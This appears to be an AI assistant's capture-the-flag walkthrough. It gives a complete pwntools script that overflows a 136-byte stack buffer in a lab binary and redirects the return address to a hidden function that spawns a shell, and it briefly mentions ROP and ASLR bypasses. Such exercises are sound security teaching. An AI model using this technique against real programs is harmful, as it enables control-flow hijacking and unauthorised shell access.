To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` to control the instruction flow and call the `not_called` function, which will give us a shell.

Here are the steps and the corresponding code:

### Steps:
1. **Identify the Buffer Overflow**: The `vulnerable_function` reads up to 256 bytes into a buffer of size 136 bytes, causing a buffer overflow.
2. **Find the Offset**: Determine the offset at which the return address is overwritten.
3. **Locate the Address of `not_called`**: Find the address of the `not_called` function.
4. **Craft the Payload**: Create a payload that overwrites the return address with the address of `not_called`.
5. **Send the Payload**: Use `pwntools` to send the payload to the vulnerable program.

### Code:

```python
from pwn import *

# Set up the context for the binary (32-bit)
context.arch = 'i386'
context.os = 'linux'

# Load the binary
binary = ELF('./challenge_binary')

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Replace 0x61616161 with the pattern found in the crash

# Address of the not_called function
not_called_addr = binary.symbols['not_called']

# Create the payload
payload = b'A' * offset
payload += p32(not_called_addr)

# Start the process
process = process(binary.path)

# Send the payload
process.sendline(payload)

# Interact with the shell
process.interactive()
```

### Explanation:

1. **Set Up Context**:
   - `context.arch = 'i386'`: Set the architecture to 32-bit.
   - `context.os = 'linux'`: Set the operating system to Linux.

2. **Load the Binary**:
   - `binary = ELF('./challenge_binary')`: Load the binary file using `pwntools`.

3. **Find the Offset**:
   - `offset = cyclic_find(0x61616161)`: Use `cyclic_find` to determine the offset where the return address is overwritten. You can generate a cyclic pattern using `cyclic(100)` and send it to the binary to find the offset when it crashes.

4. **Address of `not_called`**:
   - `not_called_addr = binary.symbols['not_called']`: Get the address of the `not_called` function from the binary.

5. **Create the Payload**:
   - `payload = b'A' * offset`: Fill the buffer with 'A's up to the offset.
   - `payload += p32(not_called_addr)`: Overwrite the return address with the address of `not_called`.

6. **Start the Process**:
   - `process = process(binary.path)`: Start the process of the binary.

7. **Send the Payload**:
   - `process.sendline(payload)`: Send the crafted payload to the binary.

8. **Interact with the Shell**:
   - `process.interactive()`: Interact with the shell that is spawned by the `not_called` function.

### Notes:
- Make sure to replace `0x61616161` with the actual value found when the binary crashes.
- If the binary has non-executable stack or other protections, you might need to use techniques like Return-Oriented Programming (ROP) or bypassing ASLR (Address Space Layout Randomization).

This should help you solve the challenge and get a shell. Good luck!
